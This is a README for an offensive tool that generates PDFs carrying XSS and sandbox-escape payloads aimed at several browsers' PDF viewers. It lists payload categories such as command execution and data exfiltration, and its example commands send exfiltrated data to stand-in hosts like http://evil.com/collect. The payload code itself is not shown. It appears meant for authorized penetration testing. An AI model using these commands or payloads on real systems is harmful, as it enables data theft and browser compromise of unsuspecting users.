# PDF-XSS Tool v4.0 - Consolidated Advanced PDF Payload Generator

## 🚀 PDF Browser Exploitation Framework

A consolidated and enhanced tool for generating PDF files with browser-specific XSS payloads designed to escape PDF sandbox restrictions. Now featuring sophisticated Chrome evasion techniques and streamlined script architecture.

## 📁 Project Structure

```
PDF-XSS/
├── pdf_xss_generator.py          # Main consolidated PDF generator (v4.0) - Primary tool
├── payload_tester.py             # Simplified testing framework (v2.0)
├── results_analyzer.py           # Simplified results analysis (v2.0)
├── chrome.json                   # Chrome/PDFium specific payloads (77 payloads) - ENHANCED
├── firefox.json                  # Firefox/PDF.js specific payloads (18 payloads)
├── safari.json                   # Safari/PDFKit specific payloads (12 payloads)
├── adobe.json                    # Adobe Reader specific payloads (15 payloads)
├── edge.json                     # Microsoft Edge specific payloads (12 payloads)
├── requirements.txt              # Python dependencies (none required)
├── IMPROVEMENTS.md               # Feature improvements documentation
├── legacy_scripts/               # Legacy scripts (deprecated, kept for reference)
├── Files/                        # Generated PDF output directory
└── README.md                     # This file
```

## ⚠️ Legal Disclaimer

This tool is designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.

## 🎯 PDF Browser Targeting

### Browser-Specific JSON Databases
- **chrome.json**: Chrome/PDFium specific exploits (77 payloads) - **ENHANCED with 20 advanced evasion techniques**
- **firefox.json**: Firefox/PDF.js specific exploits (18 payloads) - CSP bypass, DOM manipulation, file system access
- **safari.json**: Safari/PDFKit specific exploits (12 payloads) - WebKit integration, macOS-specific features
- **adobe.json**: Adobe Reader/Acrobat specific exploits (15 payloads) - Full JavaScript API exploitation
- **edge.json**: Microsoft Edge specific exploits (12 payloads) - Windows integration, WebView exploitation

### Payload Categories
- **dom_access**: Browser DOM manipulation from PDF context
- **file_system**: Local file system access and directory traversal
- **command_execution**: System command execution and process spawning
- **sandbox_escape**: PDF sandbox restriction bypasses
- **advanced_evasion**: Modern Chrome evasion techniques (NEW - 20 sophisticated payloads)
- **network_exfiltration**: Data exfiltration and covert channels
- **csp_bypass**: Content Security Policy evasion techniques
- **webkit_specific**: Safari WebKit specific exploits
- **windows_integration**: Windows OS integration exploits

### 🔥 NEW: Advanced Chrome Evasion Techniques
- **V8 Engine Bypass**: Function constructor and reflection-based execution
- **PDFium Sandbox Escape**: String.fromCharCode obfuscation and Array constructor abuse
- **CSP Bypass**: setTimeout + indirect eval methods (eval, globalThis.eval)
- **Modern Obfuscation**: Template literals, Proxy handlers, Reflect API
- **Async Execution**: Promise chains, async generators, observer patterns
- **Memory Manipulation**: WeakMap, Symbol registry, BigInt coercion
- **API Abuse**: Intl.Collator, crypto.subtle, WebAssembly integration

## 🛠️ Installation & Requirements

### Requirements
- Python 3.x
- No additional dependencies required

### Installation
```bash
# Navigate to PDF-XSS directory
cd PDF-XSS

# List available browsers and payload counts
python3 pdf_xss_generator.py --list-browsers

# Generate Chrome PDF files
python3 pdf_xss_generator.py -b chrome -u http://test.com
```

## 📖 Usage

### Main Tools

1. **pdf_xss_generator.py** - Primary PDF generation tool
2. **payload_tester.py** - Test and validate payloads
3. **results_analyzer.py** - Analyze test results

### Basic Commands

```bash
# Show help and available options
python3 pdf_xss_generator.py --help

# List available browsers and payload counts
python3 pdf_xss_generator.py --list-browsers

# Generate Chrome PDF files with custom URL (77 enhanced payloads)
python3 pdf_xss_generator.py -b chrome -u http://test.com

# Generate Firefox PDF files (limited to 5)
python3 pdf_xss_generator.py -b firefox --count 5

# Generate all browsers
python3 pdf_xss_generator.py -b all -u http://webhook.site/xyz
```

### Browser-Specific PDF Generation

```bash
# Generate individual Chrome PDF files (one payload per file)
python3 pdf_xss_generator.py -b chrome -u http://test.com

# Generate single file with all Firefox payloads (one payload per page)
python3 pdf_xss_generator.py -b firefox --single-file -u http://evil.com

# Generate Safari PDF files with custom PDF version
python3 pdf_xss_generator.py -b safari --pdf-version 1.3 -u http://test.com

# Generate Adobe Reader PDF files
python3 pdf_xss_generator.py -b adobe -u http://webhook.site/xyz

# Generate Microsoft Edge PDF files
python3 pdf_xss_generator.py -b edge -u http://collaborator.com
```

### Testing and Analysis

```bash
# Test Chrome payloads and generate report
python3 payload_tester.py -b chrome --report

# Test all browsers
python3 payload_tester.py -b all --report

# Analyze latest test results
python3 results_analyzer.py --categories --techniques --recommendations

# Analyze specific report
python3 results_analyzer.py -r test_report_20240730_123456.json
```

### Advanced Options

```bash
# Limit number of payloads
python3 pdf_xss_generator.py -b chrome --count 3 -u http://test.com

# Use older PDF version (weaker security)
python3 pdf_xss_generator.py -b firefox --pdf-version 1.3 -u http://test.com

# Custom output directory
python3 pdf_xss_generator.py -b safari -o CustomOutput -u http://test.com

# Single file mode (one payload per page)
python3 pdf_xss_generator.py -b adobe --single-file -u http://test.com

# Generate files for all advanced Chrome evasion techniques
python3 pdf_xss_generator.py -b chrome -u http://webhook.site/xyz --count 20
```

## 🏁 Command Line Flags

### PDF Generator (pdf_xss_generator.py)
| Flag | Description | Example |
|------|-------------|---------|
| `-h, --help` | Show help message | `python3 pdf_xss_generator.py --help` |
| `-b, --browser` | Target browser (required) | `-b chrome` |
| `-u, --url` | Target URL for data exfiltration | `-u http://evil.com/collect` |
| `-o, --output-dir` | Output directory | `-o Files` |
| `--single-file` | One payload per page mode | `--single-file` |
| `--count` | Limit number of payloads | `--count 5` |
| `--pdf-version` | PDF version (1.0-2.0) | `--pdf-version 1.3` |
| `--list-browsers` | List available browsers | `--list-browsers` |

### Payload Tester (payload_tester.py)
| Flag | Description | Example |
|------|-------------|---------|
| `-b, --browser` | Target browser to test | `-b chrome` |
| `--report` | Generate detailed JSON report | `--report` |

### Results Analyzer (results_analyzer.py)
| Flag | Description | Example |
|------|-------------|---------|
| `-r, --report` | Specific report file to analyze | `-r test_report_xyz.json` |
| `--categories` | Show category analysis | `--categories` |
| `--techniques` | Show evasion technique analysis | `--techniques` |
| `--recommendations` | Show improvement recommendations | `--recommendations` |

## 📁 Output Files

**All generated PDF files are automatically stored in the `Files/` directory.**

The tool creates two types of output:

### Individual Files Mode (Default)
- One PDF file per payload
- Naming: `{browser}_{technique}_{timestamp}.pdf`
- Example: `chrome_parent_window_access_20240115_143022.pdf`

### Single File Mode (`--single-file`)
- Multiple PDF files, one payload per page
- Naming: `{browser}_payload_{number}_{timestamp}.pdf`
- Example: `firefox_payload_001_20240115_143025.pdf`

## 🎯 Key Features

### ✅ Enhancements in v4.0
- **Consolidated Script Architecture**: Reduced from 5 overlapping scripts to 3 focused tools
- **Enhanced Chrome Targeting**: 77 payloads with 20 advanced evasion techniques (up from 57)
- **Modern CVE Coverage**: Updated with 2024 CVEs (CVE-2024-0519, CVE-2023-4762, etc.)
- **Advanced Evasion Techniques**: V8 engine bypass, Proxy handlers, async generators, WebAssembly
- **Sophisticated Obfuscation**: Template literals, Symbol registry, BigInt coercion
- **Testing Framework**: Built-in payload validation and effectiveness scoring
- **Results Analysis**: Comprehensive reporting with improvement recommendations

### 🗑️ Simplified Architecture
- **Merged Scripts**: Combined script.py + Another-Script.py into pdf_xss_generator.py
- **Integrated Utilities**: Payload merging functionality built into main generator
- **Streamlined Testing**: Simplified test_framework.py → payload_tester.py
- **Focused Analysis**: Simplified results_tracker.py → results_analyzer.py
- **Legacy Preservation**: Old scripts moved to legacy_scripts/ for reference

## 🔍 PDF Security Testing Examples

### Generate Test Files for Different Browsers
```bash
# Chrome PDF viewer testing
python3 script.py -b chrome -u http://collaborator.burp.com

# Firefox PDF.js testing  
python3 script.py -b firefox --single-file -u http://webhook.site/xyz

# Adobe Reader API testing
python3 script.py -b adobe -u http://requestbin.com/abc123

# Safari WebKit testing
python3 script.py -b safari --pdf-version 1.4 -u http://test.com
```

### Payload Categories Testing
Each browser JSON file contains categorized payloads:
- **DOM Access**: Test DOM manipulation capabilities
- **File System**: Test local file access restrictions
- **Command Execution**: Test system command execution
- **Network Exfiltration**: Test data exfiltration capabilities

## 🛡️ PDF-Specific Defensive Measures

To protect against PDF sandbox escape attacks:

- **Disable PDF JavaScript**: Configure PDF viewers to disable JavaScript execution
- **PDF Upload Restrictions**: Implement strict PDF upload validation and content analysis
- **Sandbox Hardening**: Use additional sandboxing layers beyond PDF viewer defaults
- **Network Monitoring**: Monitor for unusual outbound connections from PDF viewer processes
- **Content Security Policy**: Implement CSP headers that restrict PDF-initiated requests

## 📈 Changelog

### Version 3.0 (Current) - Optimization and Simplification
- **✅ Browser-specific JSON databases**: Separate JSON files for each browser (chrome.json, firefox.json, etc.)
- **✅ Simplified script interface**: Single script.py with streamlined flags
- **✅ One payload per page option**: `--single-file` flag creates individual PDFs for each payload
- **✅ Complete payload visibility**: Full JavaScript payloads visible in PDF files with filename headers
- **✅ Removed complexity**: Eliminated Another-Script.py and merge_json_payloads.py
- **✅ OS-aware targeting**: Automatic adaptation of file paths based on operating system
- **✅ Improved documentation**: Updated README with clear examples and usage patterns

### Version 2.0 - PDF Sandbox Escape Enhancement
- **Complete rewrite for PDF sandbox context**
- **PDF-specific JavaScript APIs**: Replaced browser APIs with PDF JavaScript
- **20+ sophisticated sandbox escape techniques**
- **Enhanced PDF structure**: More complex PDF objects for better escape potential

## 🚨 Security Considerations

- Always obtain proper authorization before testing
- Use in controlled environments only
- Be aware of legal implications
- Respect responsible disclosure practices
- Monitor and log all testing activities

## 📄 License

This project is for educational and authorized security testing purposes only. Please use responsibly and in accordance with applicable laws and regulations.